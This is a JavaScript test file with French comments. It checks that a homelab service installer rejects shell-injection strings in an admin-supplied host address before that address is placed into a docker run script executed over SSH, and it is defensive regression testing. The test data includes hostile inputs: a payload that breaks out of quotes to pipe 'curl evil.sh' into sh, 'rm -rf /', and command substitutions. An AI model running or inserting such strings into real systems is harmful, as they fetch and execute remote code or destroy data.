import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildServiceScript, assertValidHost } from '../src/services/serviceCatalog.js';

// Faille trouvée en auditant sshExecutor.js : ctx.address (adresse saisie
// par l'admin lors de l'installation d'un outil) était interpolée sans
// échappement dans une valeur -e '...' du script docker run exécuté sur
// l'hôte distant via SSH — une adresse contenant un guillemet simple
// permettait d'injecter des commandes shell arbitraires sur cet hôte.

test('assertValidHost accepte un nom d\'hôte et une IPv4 valides', () => {
  assert.equal(assertValidHost('homelab.local'), 'homelab.local');
  assert.equal(assertValidHost('192.168.1.50'), '192.168.1.50');
});

test('assertValidHost refuse une adresse contenant une tentative d\'injection shell', () => {
  assert.throws(() => assertValidHost("x' && curl evil.sh|sh && echo '"), /invalide/);
  assert.throws(() => assertValidHost('host; rm -rf /'), /invalide/);
  assert.throws(() => assertValidHost('$(whoami)'), /invalide/);
  assert.throws(() => assertValidHost('host`id`'), /invalide/);
});

test('assertValidHost refuse une valeur vide', () => {
  assert.throws(() => assertValidHost(''), /invalide/);
  assert.throws(() => assertValidHost(undefined), /invalide/);
});

test('buildServiceScript(woodpecker) échoue sur une adresse malveillante avant de générer le script', () => {
  assert.throws(() => buildServiceScript('woodpecker', { address: "x' && curl evil.sh|sh && echo '" }), /invalide/);
});

test('buildServiceScript(woodpecker) avec une adresse légitime ne contient aucun guillemet non fermé', () => {
  const script = buildServiceScript('woodpecker', { address: 'homelab.local' });
  assert.match(script, /WOODPECKER_HOST=http:\/\/homelab\.local:8000/);
  // Le nombre de guillemets simples doit être pair (aucune citation "ouverte"
  // par une valeur injectée) — vérification structurelle indépendante du
  // contenu exact du script.
  assert.equal((script.match(/'/g) || []).length % 2, 0);
});
